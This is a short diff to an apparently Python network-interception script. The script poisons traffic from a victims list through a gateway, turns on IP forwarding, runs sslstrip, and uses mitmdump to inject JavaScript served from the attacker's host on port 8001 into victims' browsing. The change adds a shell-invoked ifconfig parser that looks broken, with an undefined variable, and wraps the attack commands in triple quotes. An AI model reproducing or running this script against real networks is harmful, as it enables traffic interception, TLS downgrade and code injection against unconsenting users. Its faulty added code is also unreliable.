@@ -1,6 +1,6 @@
 import os
 import sys
-
+import subprocess
 #get gateway_ip (router)
 gateway = sys.argv[1]
 print("gateway: " + gateway)
@@ -14,6 +14,13 @@ print("attacker_ip: " + attacker_ip)
 victims = [line.rstrip('\n') for line in open("victims.txt")]
 print("victims:")
 print(victims)
+
+
+cmd = subprocess.Popen('ifconfig ' + interface, shell=True, stdout=subprocess.PIPE)
+for line in cmd.stdout:
+    if inet in line:
+        print line
+'''
 
 # configure routing (IPTABLES)
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
@@ -36,7 +43,7 @@ os.system("sslstrip -l 8080 &")
 # start the mitmproxy
 os.system("mitmdump -s 'injector.py http://" + attacker_ip + ":8001/script.js' -T")
 
-
+'''
 
 
 
